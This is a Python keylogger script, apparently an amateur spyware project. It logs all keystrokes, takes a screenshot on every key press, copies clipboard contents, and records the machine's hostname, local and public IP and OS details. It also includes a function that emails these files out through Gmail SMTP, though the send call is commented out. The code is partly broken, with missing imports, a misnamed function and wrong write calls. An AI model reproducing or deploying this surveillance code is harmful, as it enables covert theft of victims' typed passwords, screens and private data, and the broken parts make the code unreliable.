from pynput.keyboard import Key,Listener
import platform
import socket
import clipboard
from PIL import ImageGrab
import datetime
#Rercording each key Press
keys=[]
key_info="log.txt"
sys_info="system.txt"
clip_info="clip.txt"
email_addr=" "
password=" "
to_addr=" "
files=[]

#Function For Recording the Computer Information and storing it in system.txt File
def comp_info():
	with open(sys_info,"w") as f:
		f.write("\n###################\n")
		f.write("Computer Information :\n")
		hostname=socket.gethostname()
		try:
			publicIp=get("https://api.ipify.org").text
			f.write("Public IP: ",publicIp,"\n")
		except Exception:
			f.write("Error in Getting Public IP\n")
		IPAddr=socket.gethostbyname(hostname)
		f.write("IP:"+IPAddr+"\n")
		f.write("Processor: "+(platform.processor())+"\n")
		f.write("System :"+platform.system()+" "+platform.version()+"\n")
		f.write("Hostname: "+hostname+"\n")
		f.write("\n##################\n") 		

def copy_clipboard():
	with open(clip_info,"w") as f:
		try:
			data=clipboard.paste()
			f.write("ClipBoard Content:\n"+data)
		except:
			f.write("Error in Copying Clipboard Content\n")

def screenshot():
	img=ImageGrab.grab()
	name=str(datetime.datetime.now())+".png"
	global files 
	files+=[name]
	img.save(name)


#Function For Sending Email with the Required Attachment
def send_email(attachment,toaddr):
	from_addr=email_addr
	msg=MIMEMultipart()
	msg['From']=from_addr
	msg['To']=to_addr
	msg['Subject']="Log File"
	body="Body of the Email"
	msg.attach(MIMEText(body,'plain'))
	attachment=open(attachment,"rb")
	p=MIMEBase('application','octet-stream')
	p.set_payload((attachment).read())
	encoders.encode_base64(p)
	msg.attach(p)
	s=smtplib.SMTP('smtp.gmail.com',587)
	s.starttls()
	s.login(from_addr,password)
	text=msg.as_string()
	s.sendmail(from_addr,to_addr,text)
	s.quit()
	
#Recording  all the keystrokes and storing them in a file log.txt
def on_press(key):
	keys.append(key)
	screenshot()

def on_release(key):
	if(key==Key.esc):
	    return False

def file_write(keys):
	with open(key_info,"w") as f:
	    for key in keys:
	        k=str(key).replace("'","")
	        k=str(k).replace("Key."," ")
	        k=str(k).replace("shift","")
	        if(k.find("space")>0):
	            k=" "
	        if(k.find("enter")>0):
	            k="\n"
	        if(k.find("Esc")>0):
	           	k=" "
	        f.write(k)
	f.close()
def main():
	with Listener(on_press=on_press,on_release=on_release) as lt:
		lt.join()
	file_write(keys)
	comp_info()
	global files
	files+=[key_info]
	files+=[sys_info]
	for file in files:
		#send_mail(file,to_addr)
		print(file)

main()



